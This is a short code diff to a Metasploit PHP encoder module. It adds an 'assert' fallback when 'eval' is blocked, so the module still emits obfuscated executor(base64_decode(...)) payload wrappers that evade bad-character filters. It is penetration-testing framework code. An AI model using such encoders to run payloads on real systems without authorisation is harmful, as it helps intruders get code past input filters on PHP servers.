@@ -20,10 +20,19 @@ class MetasploitModule < Msf::Encoder
   end
 
   def encode_block(state, buf)
-    # Have to have these for the decoder stub, so if they're not available,
-    # there's nothing we can do here.
     %w[c h r ( ) . e v a l b a s e 6 4 _ d e c o d e ;].uniq.each do |c|
       raise BadcharError if state.badchars.include?(c)
+    end
+
+    executor = "eval"
+    %w[e v a l].uniq.each do |c|
+      if state.badchars.include?(c)
+        %w[a s s e r t].uniq.each do |c|
+          raise BadcharError if state.badchars.include?(c)
+        end
+        executor = "assert"
+        break
+      end
     end
 
     # Modern versions of PHP choke on unquoted literal strings.
@@ -98,6 +107,6 @@ class MetasploitModule < Msf::Encoder
     # cause a syntax error.  Remove any trailing dots.
     b64.chomp!('.')
 
-    return 'eval(base64_decode(' + quote + b64 + quote + '));'
+    return executor + '(base64_decode(' + quote + b64 + quote + '));'
   end
 end
